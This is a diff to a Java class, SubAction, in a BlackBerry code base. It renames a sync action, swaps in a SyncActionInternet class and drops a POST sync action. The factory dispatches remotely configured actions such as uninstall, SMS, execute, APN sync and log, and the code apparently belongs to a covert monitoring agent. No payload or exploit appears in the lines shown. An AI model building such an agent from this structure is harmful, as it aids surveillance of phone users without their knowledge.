@@ -9,6 +9,7 @@
 package blackberry.action;
 
 import blackberry.Status;
+import blackberry.action.sync.SyncActionApn;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
@@ -23,7 +24,7 @@ public abstract class SubAction implements Runnable {
     //#endif
 
     public static final int ACTION = 0x4000;
-    public static final int ACTION_SYNC = ACTION + 0x1;
+    public static final int ACTION_SYNC_INTERNET = ACTION + 0x1;
     public static final int ACTION_UNINSTALL = ACTION + 0x2;
     public static final int ACTION_RELOAD = ACTION + 0x3;
     public static final int ACTION_SMS = ACTION + 0x4;
@@ -34,7 +35,6 @@ public abstract class SubAction implements Runnable {
     public static final int ACTION_EXECUTE = ACTION + 0x9;
     public static final int ACTION_SYNC_APN = ACTION + 0xa;
     public static final int ACTION_LOG = ACTION + 0xb;
-    public static final int ACTION_SYNC_POST = ACTION + 0xc;
 
     public int actionId;
 
@@ -55,11 +55,11 @@ public abstract class SubAction implements Runnable {
      */
     public static SubAction factory(final int actionId_, final byte[] confParams) {
         switch (actionId_) {
-        case ACTION_SYNC:
+        case ACTION_SYNC_INTERNET:
             //#ifdef DEBUG
             debug.trace("Factory *** ACTION_SYNC ***");
             //#endif
-            return new SyncAction(actionId_, confParams);
+            return new SyncActionInternet(actionId_, confParams);
         case ACTION_UNINSTALL:
             //#ifdef DEBUG
             debug.trace("Factory *** ACTION_UNINSTALL ***");
@@ -110,11 +110,6 @@ public abstract class SubAction implements Runnable {
             debug.trace("Factory *** ACTION_INFO ***");
             //#endif
             return new LogAction(actionId_, confParams);
-        case ACTION_SYNC_POST:
-            //#ifdef DEBUG
-            debug.trace("Factory *** ACTION_POST ***");
-            //#endif
-            return new SyncActionPost(actionId_, confParams);
         default:
             return null;
         }
